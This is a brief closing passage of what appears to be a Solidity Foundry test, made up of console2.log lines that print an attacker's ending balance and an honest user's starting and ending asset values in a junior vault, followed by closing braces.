        console2.log("sizing: attacker end  ", atkEnd);
        console2.log("sizing: honest start", honestStart);
        console2.log("sizing: honest end  ", juniorVault.convertToAssets(honestShares));
    }

}
```

